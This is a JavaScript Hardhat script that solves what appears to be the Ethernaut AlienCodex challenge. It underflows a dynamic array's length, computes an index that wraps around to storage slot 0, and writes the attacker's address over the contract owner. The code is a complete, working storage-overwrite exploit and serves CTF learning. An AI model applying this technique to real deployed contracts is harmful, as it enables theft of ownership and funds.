const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let owner, tx, res, slot
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x9E193FA32e0C5FADBb1e0E429F016E726AB260Fd"
    let target = await ethers.getContractAt("AlienCodex", instanceAddress)
    // let attackerContractFactory = await ethers.getContractFactory(
    //     "PreservationAttacker"
    // )
    // let attackerContract = await attackerContractFactory.deploy()

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    // console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    tx = await target.make_contact()
    await tx.wait(1)
    tx = await target.retract()
    await tx.wait(1)
    console.log("Initial Storage:")
    for (let i = 0; i < 2; i++) {
        res = await ethers.provider.getStorageAt(instanceAddress, i)
        console.log(`Slot ${i}: ${res}`)
    }
    let loc = ethers.utils.solidityKeccak256(["uint256"], [1])
    // // Shows actual array storage location
    // for (let i = 0; i < 2; i++) {
    //     let newloc = ethers.BigNumber.from(loc).add(i).toHexString()
    //     res = await ethers.provider.getStorageAt(instanceAddress, newloc)
    //     console.log(`Slot ${newloc}: ${res}`)
    // }

    // Get 0xfff.... value
    let maxHex = await ethers.provider.getStorageAt(instanceAddress, 1)
    let index = ethers.BigNumber.from(maxHex)
        .sub(ethers.BigNumber.from(loc))
        .add(1)
    console.log("Calculated Index: ", index.toHexString())
    // pad address to make it 32 bytes
    let payload = "0x" + "00".repeat(12) + attacker.address.substring(2)
    tx = await target.revise(index.toString(), payload)
    await tx.wait(1)
    console.log("Final Storage:")
    for (let i = 0; i < 2; i++) {
        res = await ethers.provider.getStorageAt(instanceAddress, i)
        console.log(`Slot ${i}: ${res}`)
    }

    // Check
    owner = await target.owner()
    if (owner == attacker.address) {
        console.log(`${symbols.success} Pwned contract!`)
    } else {
        console.log(`${symbols.error} Owner is still set to ${owner}...`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
